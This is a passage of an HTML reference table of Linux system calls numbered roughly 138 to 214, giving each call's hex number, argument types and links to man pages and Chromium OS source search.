<td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td>
<td align="center">0x8a</td>
<td>uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">139</td>
<td>setfsgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td>
<td align="center">0x8b</td>
<td>gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">140</td>
<td>_llseek</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/_llseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_llseek">cs/</a></td>
<td align="center">0x8c</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">141</td>
<td>getdents</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents">cs/</a></td>
<td align="center">0x8d</td>
<td>unsigned int fd</td>
<td>struct linux_dirent *dirent</td>
<td>unsigned int count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">142</td>
<td>_newselect</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/_newselect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_newselect">cs/</a></td>
<td align="center">0x8e</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">143</td>
<td>flock</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td>
<td align="center">0x8f</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">144</td>
<td>msync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td>
<td align="center">0x90</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">145</td>
<td>readv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td>
<td align="center">0x91</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">146</td>
<td>writev</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td>
<td align="center">0x92</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">147</td>
<td>getsid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td>
<td align="center">0x93</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">148</td>
<td>fdatasync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td>
<td align="center">0x94</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">149</td>
<td>_sysctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/_sysctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_sysctl">cs/</a></td>
<td align="center">0x95</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">150</td>
<td>mlock</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td>
<td align="center">0x96</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">151</td>
<td>munlock</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td>
<td align="center">0x97</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">152</td>
<td>mlockall</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td>
<td align="center">0x98</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">153</td>
<td>munlockall</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td>
<td align="center">0x99</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">154</td>
<td>sched_setparam</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td>
<td align="center">0x9a</td>
<td>pid_t pid</td>
<td>struct sched_param *param</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">155</td>
<td>sched_getparam</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td>
<td align="center">0x9b</td>
<td>pid_t pid</td>
<td>struct sched_param *param</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">156</td>
<td>sched_setscheduler</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td>
<td align="center">0x9c</td>
<td>pid_t pid</td>
<td>int policy</td>
<td>struct sched_param *param</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">157</td>
<td>sched_getscheduler</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td>
<td align="center">0x9d</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">158</td>
<td>sched_yield</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td>
<td align="center">0x9e</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">159</td>
<td>sched_get_priority_max</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td>
<td align="center">0x9f</td>
<td>int policy</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">160</td>
<td>sched_get_priority_min</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td>
<td align="center">0xa0</td>
<td>int policy</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">161</td>
<td>sched_rr_get_interval</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td>
<td align="center">0xa1</td>
<td>pid_t pid</td>
<td>struct __kernel_timespec *interval</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">162</td>
<td>nanosleep</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td>
<td align="center">0xa2</td>
<td>struct __kernel_timespec *rqtp</td>
<td>struct __kernel_timespec *rmtp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">163</td>
<td>mremap</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td>
<td align="center">0xa3</td>
<td>unsigned long addr</td>
<td>unsigned long old_len</td>
<td>unsigned long new_len</td>
<td>unsigned long flags</td>
<td>unsigned long new_addr</td>
<td>-</td>
</tr>
<tr>
<td align="center">164</td>
<td>setresuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td>
<td align="center">0xa4</td>
<td>uid_t ruid</td>
<td>uid_t euid</td>
<td>uid_t suid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">165</td>
<td>getresuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td>
<td align="center">0xa5</td>
<td>uid_t *ruid</td>
<td>uid_t *euid</td>
<td>uid_t *suid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">166</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xa6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">167</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xa7</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">168</td>
<td>poll</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/poll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*poll">cs/</a></td>
<td align="center">0xa8</td>
<td>struct pollfd *ufds</td>
<td>unsigned int nfds</td>
<td>int timeout</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">169</td>
<td>nfsservctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td>
<td align="center">0xa9</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">170</td>
<td>setresgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td>
<td align="center">0xaa</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td>gid_t sgid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">171</td>
<td>getresgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td>
<td align="center">0xab</td>
<td>gid_t *rgid</td>
<td>gid_t *egid</td>
<td>gid_t *sgid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">172</td>
<td>prctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td>
<td align="center">0xac</td>
<td>int option</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td>unsigned long arg5</td>
<td>-</td>
</tr>
<tr>
<td align="center">173</td>
<td>rt_sigreturn</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td>
<td align="center">0xad</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">174</td>
<td>rt_sigaction</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td>
<td align="center">0xae</td>
<td>int</td>
<td>const struct sigaction *</td>
<td>struct sigaction *</td>
<td>size_t</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">175</td>
<td>rt_sigprocmask</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td>
<td align="center">0xaf</td>
<td>int how</td>
<td>sigset_t *set</td>
<td>sigset_t *oset</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">176</td>
<td>rt_sigpending</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td>
<td align="center">0xb0</td>
<td>sigset_t *set</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">177</td>
<td>rt_sigtimedwait</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td>
<td align="center">0xb1</td>
<td>const sigset_t *uthese</td>
<td>siginfo_t *uinfo</td>
<td>const struct __kernel_timespec *uts</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">178</td>
<td>rt_sigqueueinfo</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td>
<td align="center">0xb2</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>siginfo_t *uinfo</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">179</td>
<td>rt_sigsuspend</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td>
<td align="center">0xb3</td>
<td>sigset_t *unewset</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">180</td>
<td>pread64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td>
<td align="center">0xb4</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">181</td>
<td>pwrite64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td>
<td align="center">0xb5</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">182</td>
<td>chown</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/chown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown">cs/</a></td>
<td align="center">0xb6</td>
<td>const char *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">183</td>
<td>getcwd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td>
<td align="center">0xb7</td>
<td>char *buf</td>
<td>unsigned long size</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">184</td>
<td>capget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td>
<td align="center">0xb8</td>
<td>cap_user_header_t header</td>
<td>cap_user_data_t dataptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">185</td>
<td>capset</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td>
<td align="center">0xb9</td>
<td>cap_user_header_t header</td>
<td>const cap_user_data_t data</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">186</td>
<td>sigaltstack</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td>
<td align="center">0xba</td>
<td>const struct sigaltstack *uss</td>
<td>struct sigaltstack *uoss</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">187</td>
<td>sendfile</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td>
<td align="center">0xbb</td>
<td>int out_fd</td>
<td>int in_fd</td>
<td>off_t *offset</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">188</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xbc</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">189</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xbd</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">190</td>
<td>vfork</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/vfork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vfork">cs/</a></td>
<td align="center">0xbe</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">191</td>
<td>ugetrlimit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ugetrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ugetrlimit">cs/</a></td>
<td align="center">0xbf</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">192</td>
<td>mmap2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap2">cs/</a></td>
<td align="center">0xc0</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">193</td>
<td>truncate64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate64">cs/</a></td>
<td align="center">0xc1</td>
<td>const char *path</td>
<td>loff_t length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">194</td>
<td>ftruncate64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate64">cs/</a></td>
<td align="center">0xc2</td>
<td>unsigned int fd</td>
<td>loff_t length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">195</td>
<td>stat64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/stat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat64">cs/</a></td>
<td align="center">0xc3</td>
<td>const char *filename</td>
<td>struct stat64 *statbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">196</td>
<td>lstat64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat64">cs/</a></td>
<td align="center">0xc4</td>
<td>const char *filename</td>
<td>struct stat64 *statbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">197</td>
<td>fstat64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat64">cs/</a></td>
<td align="center">0xc5</td>
<td>unsigned long fd</td>
<td>struct stat64 *statbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">198</td>
<td>lchown32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown32">cs/</a></td>
<td align="center">0xc6</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">199</td>
<td>getuid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid32">cs/</a></td>
<td align="center">0xc7</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">200</td>
<td>getgid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid32">cs/</a></td>
<td align="center">0xc8</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">201</td>
<td>geteuid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid32">cs/</a></td>
<td align="center">0xc9</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">202</td>
<td>getegid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid32">cs/</a></td>
<td align="center">0xca</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">203</td>
<td>setreuid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid32">cs/</a></td>
<td align="center">0xcb</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">204</td>
<td>setregid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid32">cs/</a></td>
<td align="center">0xcc</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">205</td>
<td>getgroups32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups32">cs/</a></td>
<td align="center">0xcd</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">206</td>
<td>setgroups32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups32">cs/</a></td>
<td align="center">0xce</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">207</td>
<td>fchown32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown32">cs/</a></td>
<td align="center">0xcf</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">208</td>
<td>setresuid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid32">cs/</a></td>
<td align="center">0xd0</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">209</td>
<td>getresuid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid32">cs/</a></td>
<td align="center">0xd1</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">210</td>
<td>setresgid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid32">cs/</a></td>
<td align="center">0xd2</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">211</td>
<td>getresgid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid32">cs/</a></td>
<td align="center">0xd3</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">212</td>
<td>chown32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/chown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown32">cs/</a></td>
<td align="center">0xd4</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">213</td>
<td>setuid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid32">cs/</a></td>
<td align="center">0xd5</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">214</td>
<td>setgid32</td>
